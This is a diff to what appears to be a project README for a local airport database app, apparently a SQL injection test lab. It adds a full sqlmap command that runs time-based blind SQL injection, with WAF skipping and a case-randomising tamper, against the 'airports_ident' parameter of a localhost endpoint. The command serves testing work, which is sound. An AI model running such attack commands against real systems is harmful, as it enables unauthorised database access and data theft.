@@ -14,6 +14,10 @@ python3 ./main.py -ini ini.ini
 ```
 
 ```
+sqlmap -v 3  --skip-waf -D dataset --level=5 --risk=1 --batch --skip='user-agent,referer,host'  --eval="import random;airports_wikipedia_link=random.choice(['https://fr.wikipedia.org/wiki/A%C3%A9rodrome_de_Bagnoles-de-l%27Orne_-_Couterne', 'https://en.wikipedia.org/wiki/Funter_Bay_Seaplane_Base', 'https://en.wikipedia.org/wiki/Dalbandin_Airport', 'https://en.wikipedia.org/wiki/Cessna_Aircraft_Field', 'https://en.wikipedia.org/wiki/Montgomery_County_Airpark', 'https://en.wikipedia.org/wiki/Khwai_River_Airport', 'https://en.wikipedia.org/wiki/Magan_Airport', 'https://en.wikipedia.org/wiki/Tiksi_North', 'https://en.wikipedia.org/wiki/Barrie-Orillia_(Lake_Simcoe_Regional)_Airport', 'https://en.wikipedia.org/wiki/Chehalis%E2%80%93Centralia_Airport']);"   -p 'airports_ident'  -tamper="randomcase" --technique=T -u "http://localhost:8080/airport-U3?airports_wikipedia_link=https%3A%2F%2Fde.wikipedia.org%2Fwiki%2FFlugplatz_Schw%25C3%25A4bisch_Hall-Hessental&airports_ident=30XA" 
+```
+
+```
 CREATE TABLE airport (
     id INT PRIMARY KEY AUTO_INCREMENT,
     ident VARCHAR(10) NOT NULL UNIQUE,
